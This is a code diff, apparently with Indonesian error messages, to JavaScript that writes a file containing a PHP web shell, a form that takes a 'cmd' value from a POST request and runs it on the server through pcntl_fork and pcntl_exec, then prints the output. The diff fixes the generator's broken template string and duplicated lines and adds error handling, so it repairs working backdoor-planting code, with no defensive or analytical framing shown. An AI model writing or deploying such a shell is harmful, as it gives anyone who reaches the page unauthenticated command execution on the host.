@@ -32,16 +32,11 @@
           fileEntry.createWriter(function(fileWriter) {
             const htmlContent = `<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
-    $cmd = trim($_POST['cmd']);<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
-
     if ($cmd !== '') {
         $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
-
         if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
             $pid = pcntl_fork();
-
             if ($pid == -1) {
                 echo "Fork failed.";
             } elseif ($pid === 0) {
@@ -49,7 +44,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
                 exit(1);
             } else {
                 pcntl_wait($status);
-
                 if (file_exists($tmpFile)) {
                     echo "<pre>" . htmlspecialchars(file_get_contents($tmpFile)) . "</pre>";
                     unlink($tmpFile);
@@ -63,11 +57,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
     }
 }
 ?>
-
 <form method="post">
     <input type="text" name="cmd" placeholder="Enter command" />
     <input type="submit" value="Run" />
-</form>;
+</form>`;
 
             const blob = new Blob([htmlContent], { type: "text/html" });
 
@@ -81,6 +74,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
             };
 
             fileWriter.write(blob);
+          }, function(err) {
+            console.error("Gagal membuat file writer:", err);
           });
         }, function(err) {
           console.error("Gagal membuat file:", err);
